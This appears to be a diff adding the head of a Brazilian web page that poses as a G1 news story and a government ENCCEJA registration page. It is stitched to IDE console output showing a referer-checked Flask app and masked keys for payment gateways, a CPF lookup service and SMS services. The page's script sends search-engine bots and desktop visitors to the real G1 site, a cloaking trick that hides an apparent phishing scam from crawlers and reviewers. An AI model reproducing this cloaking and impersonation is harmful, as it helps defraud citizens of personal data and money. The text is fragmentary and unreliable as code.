@@ -1,0 +1,121 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <head>
+        <script type="text/javascript">
+            (function(c,l,a,r,i,t,y){
+                c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+                t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+                y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+            })(window, document, "clarity", "script", "qs9kqwmhmp");
+        </script>
+        <meta charset="utf-8"/>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+        <title>
+         G1 - Governo lança Programa Crédito do Trabalhador com juros quase zerados
+        </title>
+        <script>
+         // Função para detectar se é um dispositivo móvel
+          function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+          }
+
+          // Função para detectar se é um bot
+          function isBot() {
+            const botAgents = [
+              'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+              'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+            ];
+
+            return botAgents.some(bot => navigator.userAgent.includes(bot));
+          }
+
+          // Função para verificar se a largura da janela é maior que 768px
+          function isWideScreen() {
+            return window.innerWidth > 768;
+          }
+
+          // Redirecionar ou bloquear o acesso
+          function checkAccess() {
+            if (isBot() || (!isMobile() && isWideScreen())) {
+              // Redirecionar para o site G1 se o acesso for bloqueado
+              window.location.href = "https://g1.globo.com/";
+            }
+          }
+
+          // Executar a função de verificação ao carregar a página
+          window.onload = checkAccess;
+
+          // Adicionar um listener para verificar novamente se a janela for redimensionada
+          window.addEventListener('resize', checkAccess);
+        </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>ENCCEJA 2025 - Inscrição</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        .gov-header {
+            background-color: #222222;
+        }
+Edited app.py
+-1
++0
+-1
++0
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+@app.route('/obrigado')
+@check_referer
+def thank_you():
+    try:
+        # Get customer data from query parameters if available
+Restarted Start application
+Start application
+The agent has not started.
+34s
+ • 
+Just now
+Port :5000 opened on
+PGHOST
+••••••••
+PGPORT
+••••••••
+PGUSER
+••••••••
+PGPASSWORD
+••••••••
+DATABASE_URL
+••••••••
+PGDATABASE
+••••••••
+FOR4PAYMENTS_API_KEY
+••••••••
+FOR4PAYMENTS_SECRET_KEY
+••••••••
+META_PIXEL_ID
+••••••••
+BUSCAR_CPF_TOKEN
+••••••••
+VERIFICATION_TOKEN
+••••••••
+SMS_API_KEY
+••••••••
+NOVAERA_PAYMENT_TOKEN
+••••••••
+SESSION_SECRET
+••••••••
+GATEWAY_CHOICE
+••••••••
+SMS_OWEN_TOKEN
+••••••••
+sms_token
+••••••••
+VITE_URL
+••••••••
+/
+1
+
+Unsupported state: your index is currently locked. This can happen if multiple git processes are running operations at the same time.
+Please resolve the issue. If you are sure you do not have git operations running, you can delete your .git/index.lock file.
